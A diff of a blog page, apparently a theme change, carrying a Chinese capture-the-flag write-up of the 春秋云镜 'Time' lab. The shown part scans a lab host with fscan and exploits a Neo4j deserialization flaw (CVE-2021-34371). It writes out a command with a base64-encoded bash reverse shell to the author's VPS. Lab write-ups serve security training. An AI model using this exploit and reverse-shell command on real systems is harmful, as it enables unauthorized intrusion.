@@ -1,182 +1,183 @@
 <!DOCTYPE html>
-<html lang=en>
-<head>
-    <!-- so meta -->
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="HandheldFriendly" content="True">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="flag1fscan扫一下.&#x2F;fscan.exe -h 39.99.225.0 -p 1-65535 扫出来有个Neo4j Browser，存在nday(https:&#x2F;&#x2F;github.com&#x2F;zwjjustdoit&#x2F;CVE-2021-34371.jar)，弹个shell到自己vps上，用户目录直接拿flag 1java -jar .\rhino_gadget.jar rmi:&#x2F;&#x2F;39.99.128">
-<meta property="og:type" content="article">
-<meta property="og:title" content="春秋云镜Time">
-<meta property="og:url" content="https://rufeii.github.io/2026/01/07/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTime/index.html">
-<meta property="og:site_name" content="Rufeii">
-<meta property="og:description" content="flag1fscan扫一下.&#x2F;fscan.exe -h 39.99.225.0 -p 1-65535 扫出来有个Neo4j Browser，存在nday(https:&#x2F;&#x2F;github.com&#x2F;zwjjustdoit&#x2F;CVE-2021-34371.jar)，弹个shell到自己vps上，用户目录直接拿flag 1java -jar .\rhino_gadget.jar rmi:&#x2F;&#x2F;39.99.128">
-<meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://rufeii.github.io/images/achieve/2026/1/image-20260107205245814.png">
-<meta property="og:image" content="https://rufeii.github.io/images/achieve/2026/1/image-20260107210729433.png">
-<meta property="og:image" content="https://rufeii.github.io/images/achieve/2026/1/image-20260107212159501.png">
-<meta property="og:image" content="https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/2023/08/7-1-1024x278.png">
-<meta property="og:image" content="https://rufeii.github.io/images/achieve/2026/1/image-20260107233812932.png">
-<meta property="og:image" content="https://rufeii.github.io/images/achieve/2026/1/image-20260107231729501.png">
-<meta property="og:image" content="https://rufeii.github.io/images/achieve/2026/1/image-20260107232346779.png">
-<meta property="article:published_time" content="2026-01-07T12:34:30.000Z">
-<meta property="article:modified_time" content="2026-01-08T09:46:42.473Z">
-<meta property="article:author" content="Rufeii">
-<meta property="article:tag" content="pass the hash">
-<meta property="article:tag" content="SID滥用">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://rufeii.github.io/images/achieve/2026/1/image-20260107205245814.png">
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="Rufeii" />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  
+  
+  <title>
     
-    
-      
-        
-          <link rel="shortcut icon" href="/images/website.jpg">
-        
+      春秋云镜Time 
       
       
-        
-          <link rel="icon" type="image/png" href="/images/website.jpg" sizes="192x192">
-        
-      
-      
-        
-          <link rel="apple-touch-icon" sizes="180x180" href="/images/website.jpg">
-        
-      
+      |
     
-    <!-- title -->
-    <title>春秋云镜Time</title>
-    <!-- async scripts -->
-    <!-- Google Analytics -->
+     Rufeii
+  </title>
 
-
-    <!-- Umami Analytics -->
-
-
-    <!-- styles -->
-    
-<link rel="stylesheet" href="/css/style.css">
-
-    <!-- persian styles -->
-    
-    <!-- rss -->
-    
-    
-	<!-- mathjax -->
-	
-<meta name="generator" content="Hexo 7.3.0"></head>
-
-<body class="max-width mx-auto px3 ltr">
-    
-      <div id="header-post">
-  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
-  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
-  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
-  <span id="menu">
-    <span id="nav">
-      <ul>
-        <!--
-       --><li><a href="/">h0me</a></li><!--
-     --><!--
-       --><li><a href="/about/">ab0ut</a></li><!--
-     --><!--
-       --><li><a href="/categories/">categ0ries</a></li><!--
-     --><!--
-       --><li><a href="/links/">links</a></li><!--
-     --><!--
-       --><li><a href="/search/">Search</a></li><!--
-     -->
-      </ul>
-    </span>
-    <br/>
-    <span id="actions">
-      <ul>
-        
-        <li><a class="icon" aria-label="Previous post" href="/2026/02/03/something-about-buuctf/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
-        
-        
-        <li><a class="icon" aria-label="Next post" href="/2026/01/04/something-about-XSS-Challenges/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
-        
-        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
-      </ul>
-      <span id="i-prev" class="info" style="display:none;">Previous post</span>
-      <span id="i-next" class="info" style="display:none;">Next post</span>
-      <span id="i-top" class="info" style="display:none;">Back to top</span>
-      <span id="i-share" class="info" style="display:none;">Share post</span>
-    </span>
-    <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://rufeii.github.io/2026/01/07/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTime/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://rufeii.github.io/2026/01/07/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTime/&text=春秋云镜Time"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://rufeii.github.io/2026/01/07/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTime/&title=春秋云镜Time"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rufeii.github.io/2026/01/07/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTime/&is_video=false&description=春秋云镜Time"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=春秋云镜Time&body=Check out this article: https://rufeii.github.io/2026/01/07/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTime/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://rufeii.github.io/2026/01/07/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTime/&title=春秋云镜Time"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://rufeii.github.io/2026/01/07/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTime/&title=春秋云镜Time"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://rufeii.github.io/2026/01/07/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTime/&title=春秋云镜Time"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://rufeii.github.io/2026/01/07/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTime/&title=春秋云镜Time"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://rufeii.github.io/2026/01/07/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTime/&name=春秋云镜Time&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://rufeii.github.io/2026/01/07/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTime/&t=春秋云镜Time"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-    
-    
-      <div id="toc">
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#flag1"><span class="toc-number">1.</span> <span class="toc-text">flag1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag2"><span class="toc-number">2.</span> <span class="toc-text">flag2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag3-flag4"><span class="toc-number">3.</span> <span class="toc-text">flag3&amp;flag4</span></a></li></ol>
-      </div>
-    
-  </span>
-</div>
-
-    
-    <div class="content index py4 ">
-        
-        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
-  <header>
-    
-    <h1 class="posttitle p-name" itemprop="name headline">
-        春秋云镜Time
-    </h1>
-
-
-
-    <div class="meta">
-      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
-        <span class="p-name" itemprop="name">Rufeii</span>
-      </span>
-      
-    <div class="postdate">
-      
-        <time datetime="2026-01-07T12:34:30.000Z" class="dt-published" itemprop="datePublished">2026-01-07</time>
-        
-      
-    </div>
-
-
-      
-    <div class="article-category">
-        <i class="fa-solid fa-archive"></i>
-        <a class="category-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
-    </div>
-
-
-      
-    <div class="article-tag">
-        <i class="fa-solid fa-tag"></i>
-        <a class="p-category" href="/tags/SID%E6%BB%A5%E7%94%A8/" rel="tag">SID滥用</a>, <a class="p-category" href="/tags/pass-the-hash/" rel="tag">pass the hash</a>
-    </div>
-
-
-    </div>
-  </header>
+  
+    <link rel="apple-touch-icon" href="/images/me.jpg">
+    <link rel="icon" href="/images/me.jpg">
   
 
-  <div class="content e-content" itemprop="articleBody">
-    <h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>fscan扫一下<code>./fscan.exe -h 39.99.225.0 -p 1-65535</code></p>
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/me.jpg" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Rufeii</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Categories</a>
+        </li>
+      
+        <li class="nav-item" data-path="/search/">
+          <a href="/search/">Search</a>
+        </li>
+      
+        <li class="nav-item" data-path="/links/">
+          <a href="/links/">Links</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">春秋云镜Time</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          2026-01-08 17:46:42
+        </span>
+        
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="Categories"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" title="内网渗透">
+                    <b>#</b> 内网渗透
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>fscan扫一下<code>./fscan.exe -h 39.99.225.0 -p 1-65535</code></p>
 <p>扫出来有个Neo4j Browser，存在nday(<a target="_blank" rel="noopener" href="https://github.com/zwjjustdoit/CVE-2021-34371.jar)%EF%BC%8C%E5%BC%B9%E4%B8%AAshell%E5%88%B0%E8%87%AA%E5%B7%B1vps%E4%B8%8A%EF%BC%8C%E7%94%A8%E6%88%B7%E7%9B%AE%E5%BD%95%E7%9B%B4%E6%8E%A5%E6%8B%BFflag">https://github.com/zwjjustdoit/CVE-2021-34371.jar)，弹个shell到自己vps上，用户目录直接拿flag</a></p>
 <figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar .<span class="keyword">\rhino</span><span class="built_in">_</span>gadget.jar rmi://39.99.128.12:1337 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzUueHgueHgueHgvOTk5OSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; </span><br></pre></td></tr></table></figure>
 
@@ -243,150 +244,159 @@
 
 
 
-  </div>
-</article>
-
-
-
-        
-          <div id="footer-post-container">
-  <div id="footer-post">
-
-    <div id="nav-footer" style="display: none">
-      <ul>
-        
-          <li><a href="/">h0me</a></li>
-        
-          <li><a href="/about/">ab0ut</a></li>
-        
-          <li><a href="/categories/">categ0ries</a></li>
-        
-          <li><a href="/links/">links</a></li>
-        
-          <li><a href="/search/">Search</a></li>
-        
-      </ul>
-    </div>
-
-    
-    
-      <div id="toc-footer" style="display: none">
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#flag1"><span class="toc-number">1.</span> <span class="toc-text">flag1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag2"><span class="toc-number">2.</span> <span class="toc-text">flag2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag3-flag4"><span class="toc-number">3.</span> <span class="toc-text">flag3&amp;flag4</span></a></li></ol>
       </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2026/01/04/something-about-XSS-Challenges/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              2026-01-08 17:46:42
+            </span>
+            
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="Categories"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" title="内网渗透">
+                        <b>#</b> 内网渗透
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2026/02/03/something-about-buuctf/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
     
-
-    <div id="share-footer" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://rufeii.github.io/2026/01/07/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTime/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://rufeii.github.io/2026/01/07/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTime/&text=春秋云镜Time"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://rufeii.github.io/2026/01/07/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTime/&title=春秋云镜Time"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rufeii.github.io/2026/01/07/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTime/&is_video=false&description=春秋云镜Time"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=春秋云镜Time&body=Check out this article: https://rufeii.github.io/2026/01/07/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTime/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://rufeii.github.io/2026/01/07/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTime/&title=春秋云镜Time"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://rufeii.github.io/2026/01/07/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTime/&title=春秋云镜Time"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://rufeii.github.io/2026/01/07/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTime/&title=春秋云镜Time"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://rufeii.github.io/2026/01/07/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTime/&title=春秋云镜Time"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://rufeii.github.io/2026/01/07/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTime/&name=春秋云镜Time&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://rufeii.github.io/2026/01/07/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTime/&t=春秋云镜Time"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-
-    <div id="actions-footer">
-        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
-        
-          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
-        
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
-    </div>
-
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
   </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#flag1"><span class="toc-text">flag1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag2"><span class="toc-text">flag2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag3-flag4"><span class="toc-text">flag3&amp;flag4</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" target="_blank" rel="noopener" href="https://github.com/rufeii/rufeii.github.io">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a href="/">Copyright © 2026 Rufeii</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
 </div>
 
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
         
-        <footer id="footer">
-  <div class="footer-left">
-    Copyright &copy;
-    
-    
-    2025-2026
-    Rufeii
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
   </div>
-  <div class="footer-right">
-    <nav>
-      <ul>
-        <li><a href="/">h0me</a></li><li><a href="/about/">ab0ut</a></li><li><a href="/categories/">categ0ries</a></li><li><a href="/links/">links</a></li><li><a href="/search/">Search</a></li>
-      </ul>
-      <ul>
-            
-              <span id="busuanzi_container_site_pv">
-                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
-              </span>
-              <span class="post-meta-divider">|</span>
-              <span id="busuanzi_container_site_uv" style='display:none'>
-                      本站访客数<span id="busuanzi_value_site_uv"></span>人
-              </span>
-              
-            
-      </ul>
-    </nav>
-  </div>
-</footer>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + %E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTime + '&url=' + https%3A%2F%2Frufeii.github.io%2F2026%2F01%2F07%2F%25E6%2598%25A5%25E7%25A7%258B%25E4%25BA%2591%25E9%2595%259CTime%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://rufeii.github.io/2026/01/07/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CTime/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
     </div>
-    <!-- styles -->
-
-
-
-  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
-
-
-    <!-- jquery -->
-
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
-
-
-
-
-<!-- clipboard -->
-
   
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
   
-  <script type="text/javascript">
-  $(function() {
-    // copy-btn HTML
-    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
-    btn += '<i class="fa-regular fa-clone"></i>';
-    btn += '</span>';
-    // mount it!
-    $(".highlight table").before(btn);
-    var clip = new ClipboardJS('.btn-copy', {
-      text: function(trigger) {
-        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
-      }
-    });
-    clip.on('success', function(e) {
-      e.trigger.setAttribute('aria-label', "Copied!");
-      e.clearSelection();
-    })
-  })
-  </script>
+<script src="/js/shares.js"></script>
 
 
-<script src="/js/main.js"></script>
 
-<!-- search -->
-
-<!-- Baidu Analytics -->
-
-<!-- Cloudflare Analytics -->
-
-<!-- Disqus Comments -->
-
-<!-- utterances Comments -->
-
-
-<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-</body>
+      </div>
+    </div>
+  </body>
 </html>
